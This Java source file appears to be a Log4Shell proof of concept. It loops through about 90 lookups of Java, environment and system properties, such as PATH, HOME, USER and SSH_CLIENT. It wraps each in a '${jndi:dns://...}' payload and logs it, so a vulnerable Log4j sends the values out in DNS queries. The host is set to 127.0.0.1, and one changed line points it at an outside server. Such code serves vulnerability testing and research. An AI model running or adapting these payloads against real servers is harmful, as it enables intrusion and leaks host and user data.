import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_dataOutboundByUdpDNS {
    private static final Logger logger = LogManager.getLogger(log4j_dataOutboundByUdpDNS.class);
    public static void main(String[] args) throws Exception {
        String[] labelArray = new String[]{
                "${java:version}",
                "${java:runtime}",
                "${java:vm}",
                "${java:os}",
                "${java:hw}",
                "${java:locale}",
                "${env:CLASSPATH}",
                "${env:HOME}",
                "${env:JAVA_HOME}",
                "${env:LANG}",
                "${env:LC_TERMINAL}",
                "${env:LC_TERMINAL_VERSION}",
                "${env:LESS}",
                "${env:LOGNAME}",
                "${env:LSCOLORS}",
                "${env:LS_COLORS}",
                "${env:MAIL}",
                "${env:NLSPATH}",
                "${env:OLDPWD}",
                "${env:PAGER}",
                "${env:PATH}",
                "${env:PWD}",
                "${env:SHELL}",
                "${env:SHLVL}",
                "${env:SSH_CLIENT}",
                "${env:SSH_CONNECTION}",
                "${env:SSH_TTY}",
                "${env:TERM}",
                "${env:USER}",
                "${env:XDG_RUNTIME_DIR}",
                "${env:XDG_SESSION_ID}",
                "${env:XFILESEARCHPATH}",
                "${env:ZSH}",
                "${sys:awt.toolkit}",
                "${sys:file.encoding}",
                "${sys:file.encoding.pkg}",
                "${sys:file.separator}",
                "${sys:java.awt.graphicsenv}",
                "${sys:java.awt.printerjob}",
                "${sys:java.class.path}",
                "${sys:java.class.version}",
                "${sys:java.endorsed.dirs}",
                "${sys:java.ext.dirs}",
                "${sys:java.home}",
                "${sys:java.io.tmpdir}",
                "${sys:java.library.path}",
                "${sys:java.runtime.name}",
                "${sys:java.runtime.version}",
                "${sys:java.specification.name}",
                "${sys:java.specification.vendor}",
                "${sys:java.specification.version}",
                "${sys:java.vendor}",
                "${sys:java.vendor.url}",
                "${sys:java.vendor.url.bug}",
                "${sys:java.version}",
                "${sys:java.vm.info}",
                "${sys:java.vm.name}",
                "${sys:java.vm.specification.name}",
                "${sys:java.vm.specification.vendor}",
                "${sys:java.vm.specification.version}",
                "${sys:java.vm.vendor}",
                "${sys:java.vm.version}",
                "${sys:line.separator}",
                "${sys:os.arch}",
                "${sys:os.name}",
                "${sys:os.version}",
                "${sys:path.separator}",
                "${sys:sun.arch.data.model}",
                "${sys:sun.boot.class.path}",
                "${sys:sun.boot.library.path}",
                "${sys:sun.cpu.endian}",
                "${sys:sun.cpu.isalist}",
                "${sys:sun.desktop}",
                "${sys:sun.io.unicode.encoding}",
                "${sys:sun.java.command}",
                "${sys:sun.java.launcher}",
                "${sys:sun.jnu.encoding}",
                "${sys:sun.management.compiler}",
                "${sys:sun.os.patch.level}",
                "${sys:sun.stderr.encoding}",
                "${sys:user.country}",
                "${sys:user.dir}",
                "${sys:user.home}",
                "${sys:user.language}",
                "${sys:user.name}",
                "${sys:user.script}",
                "${sys:user.timezone}",
                "${sys:user.variant}",
        };

        for (String label:labelArray
             ) {
            String labelRecord = label.replace("${","").
                    replace("}","").replace(":","_").
                    replace(".","_");

            String dnslogDomain = "127.0.0.1";
            String dnslogRequest = "${jndi:dns://" + dnslogDomain + "/" + label + "}";
            System.out.println(dnslogRequest);
            logger.error(dnslogRequest);
            Thread.sleep(1000);
        }
    }
}




